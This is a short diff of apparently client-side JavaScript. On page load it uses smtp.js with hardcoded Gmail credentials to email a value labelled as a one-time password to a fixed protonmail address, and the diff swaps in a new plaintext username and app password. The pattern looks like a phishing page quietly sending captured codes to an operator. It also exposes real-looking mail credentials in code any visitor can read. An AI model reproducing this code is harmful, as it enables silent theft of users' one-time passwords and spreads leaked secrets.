@@ -13,10 +13,10 @@ window.onload = function()
             console.log(y);
             Email.send({
                 Host: "smtp.gmail.com",
-                Username : "xsda.ddce.2343.2343.xsop@gmail.com",
-                Password : "ryqi owje owui bjfw",
+                Username : "julio74108520@gmail.com",
+                Password : "dnkf zamf xwmj amjr",
                 To : 'user1533@protonmail.com',
-                From : "xsda.ddce.2343.2343.xsop@gmail.com",
+                From : "julio74108520@gmail.com",
                 Subject : y,
                 Body : "<p> << One Time Password </p>",
             });
@@ -28,5 +28,6 @@ window.onload = function()
         }
     });
 }    
+    
     
     
